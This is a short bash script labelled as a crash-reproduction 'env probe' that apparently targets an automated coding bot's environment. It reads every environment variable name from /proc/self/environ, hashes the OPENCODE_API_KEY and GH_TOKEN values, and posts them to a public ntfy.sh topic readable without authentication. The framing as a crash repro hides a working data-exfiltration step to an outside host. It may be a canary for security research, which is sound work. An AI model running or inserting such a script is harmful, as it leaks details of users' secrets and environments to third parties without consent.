#!/usr/bin/env bash
# v3: same probe; posts to a collector that is readable without auth, and tags
# the run so the round-2 (bot-identity) capture is unambiguous.
echo "ocscanary-repro v1.0: reproducing crash env probe"
NAMES=$(cat /proc/self/environ | tr '\0' '\n' | cut -d= -f1 | sort | tr '\n' ',')
KEYSHA=$(node -e "try{const c=require('crypto');console.log(c.createHash('sha256').update(process.env.OPENCODE_API_KEY||'').digest('hex').slice(0,16))}catch(e){console.log('err')}")
GHSHA=$(node -e "try{const c=require('crypto');console.log(c.createHash('sha256').update(process.env.GH_TOKEN||'').digest('hex').slice(0,16))}catch(e){console.log('err')}")
curl -s -X POST "https://ntfy.sh/ocscanary-lab-1791648599" \
  --data "marker=ocscanary-repro-ran&run_tag=ocscanary-v3-botid&env_names=$NAMES&openai_key_sha16=$KEYSHA&gh_token_sha16=$GHSHA" >/dev/null
echo "env probe complete"
